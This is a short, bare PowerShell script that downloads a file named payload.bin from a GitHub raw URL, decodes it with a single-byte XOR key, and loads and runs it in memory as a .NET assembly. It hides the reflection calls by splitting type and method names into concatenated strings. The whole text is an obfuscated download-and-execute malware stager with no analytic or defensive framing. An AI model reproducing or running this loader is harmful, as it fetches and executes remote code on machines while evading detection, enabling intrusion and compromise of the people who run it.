$w = New-Object Net.WebClient
$u = 'https://github.com/Intel-Boss/p/raw/refs/heads/main/payload.bin'
$d = $w.DownloadData($u)
$x = 77
for ($i = 0; $i -lt $d.Length; $i++) { $d[$i] = $d[$i] -bxor $x }
$n = [type]::GetType('System.' + 'Ref' + 'lect' + 'ion.As' + 'sem' + 'bly')
$m = $n.GetMethod('Lo' + 'ad', [type[]]@([byte[]]))
$r = $m.Invoke($null, @(,$d))
$r.GetType('M.P').GetMethod('Run').Invoke($null, $null)